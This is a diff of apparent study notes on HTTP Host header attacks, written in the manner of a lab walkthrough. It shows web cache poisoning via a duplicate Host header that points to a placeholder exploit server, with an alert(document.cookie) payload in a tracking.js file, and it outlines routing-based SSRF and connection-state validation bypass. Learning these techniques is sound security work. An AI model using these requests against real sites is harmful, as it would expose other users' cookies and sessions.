@@ -29,11 +29,6 @@ If we can change Host: header to any value and still successfully access the hom
 To reduce latency cache sits between the back-end server and the user where it saves (caches) the responses to particular requests, usually for a fixed amount of time. If another user sends equivalent request, cache simply serves a copy of the cached response w/o interfering with back-end server.
 If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning. Next step is to make cache server to save our malicious request! 
 
-
-
-Standalone caches typically include the Host header in the cache key, so this approach usually works best on integrated, application-level caches. That said, the techniques discussed earlier can sometimes enable you to poison even standalone web caches.
-
-
 1.) GET request response with Cache header, also tampering with Host: header doesnt load website.
 > Cache-Control: max-age=30  
 > X-Cache: miss  
@@ -47,16 +42,22 @@ Response contains our test code in: "<script type="text/javascript" src="//test.
 > EX-Cache: hit  
 
 4.) Create malicious domain where store your exploit.
-Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:
+Back in Burp Repeater, add a second Host header containing your exploit server domain name
 
-> GET /?cb=123 HTTP/1.1  # "?cb=123" is random, used as unique cache key that we know 
+> GET /?cb=123 HTTP/1.1  # "?cb=123" is random, used as unique cache key that we know  
 > Host: realwebsite.net  
 > Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net  
 
+Exploit file: /resources/js/tracking.js and body alert(document.cookie)
 
-/resources/js/tracking.js
-alert(document.cookie)
+### Routing-based SSRF - Host header SSRF attacks
 
+Cloud-based architectures, load balancers and reverse proxies receive requests and forward them to the appropriate back-end. If they are insecurely configured to forward requests based on an unvalidated Host header, they can be manipulated into misrouting requests.
+
+### Routing-based SSRF - Host header SSRF attacks
+
+### Host validation bypass via connection state attack
+Poorly implemented HTTP server settings state that Host: header, are identical for all HTTP/1.1 requests. Or servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection.
 
 
 
